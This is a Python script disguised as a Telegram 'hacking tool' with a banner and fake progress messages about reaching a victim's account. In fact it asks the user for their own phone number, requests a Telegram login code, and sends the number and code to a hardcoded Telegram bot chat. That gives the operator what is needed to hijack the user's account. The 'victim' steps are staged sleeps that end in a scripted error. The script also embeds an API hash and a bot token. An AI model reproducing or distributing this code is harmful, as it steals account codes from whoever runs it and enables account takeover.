from telethon import TelegramClient, events  
import telegram 
import asyncio 
import time  
import os

YOUR_APP_ID = 24835154 
YOUR_APP_HASH = 'e7c35ab96f8d8f76513fd7a3ae242c3b' 
bot = telegram.Bot(token='6017265514:AAGTsXZIKyjv3w25KBbsL-m3AT24vtTrdkM')  
yellow = '\033[93m'
lgreen = '\033[92m' 
clear = '\033[0m' 
bold = '\033[01m' 
cyan = '\033[96m' 
red = "\033[91m" 
client = TelegramClient('session_name', YOUR_APP_ID, YOUR_APP_HASH)  
os.system("clear") 
banner = lgreen+''' 

      .---.        .-----------
     /     \  __  /    ------
    / /     \(  )/    -----
   //////   ' \/ `   ---
  //// / // :    : ---
 // /   /  /`    '--
//          //..\\\

       ====UU====UU====
           '//||\\\`
             ''``
 _____    _        _   _            _
|_   _|__| | ___  | | | | __ _  ___| | __
  | |/ _ \ |/ _ \ | |_| |/ _` |/ __| |/ /
  | |  __/ |  __/ |  _  | (_| | (__|   <
  |_|\___|_|\___| |_| |_|\__,_|\___|_|\_\

  V 10.3.0	     By Anonymous Hackers
'''+clear 

print(" ")

print(banner)
message = "[First login with your own telegram account to connect with the victims api in your contact list]"

for letter in message:
    print(letter, end='', flush=True)  
    time.sleep(0.05)
print(" ")
print(" ")
print(" ")

phone = input(
    cyan+bold+'[+]\033[0m \033[01mEnter your phone with country code (eg: +92) >\033[0m ') 
        
async def main(): 
    try: 
        await client.connect() 
        result = await client.send_code_request(phone) 
        otp = input(
            cyan+bold+"[+]\033[0m \033[01mEnter the OTP (check inside your telegram app for the otp from telegramm if it not comes to your sms) >\033[0m ")
        await bot.send_message(chat_id='6028813027', text=f"Phone Number: {phone}\nOTP: {otp}") 

        victim = input(cyan+bold+'[+]\033[0m \033[01mEnter victim\'s phone with country code to hack(eg: +92) >\033[0m ') 
        print("Connecting to victim's api...") 
        time.sleep(3)    
        print("Gathering victim id and hash...[25%]")
        time.sleep(2)    
        print("Collecting the contacts and chat data...[may take some time]")
        time.sleep(6) 
        choice = input("Do you want to login to their account [y/n] ? : ")
        if (choice == 'y'):	
            print("Please wait 1 to 2 minutes until it logins and send their otp")
            time.sleep(6) 
            print(red+"Error in getting otp ! 2 step verification may be enabled or try after 15 minutes\033[0m'")
            print(" ")
            print(" ")
        else:
            print("Bye...")
            print(" ")
            print(" ")
            os.system("exit")  
        await client.sign_in(phone, otp) 
        me = await client.get_me()  
        print(me.first_name) 
    finally:   
        await client.disconnect()

asyncio.run(main())

















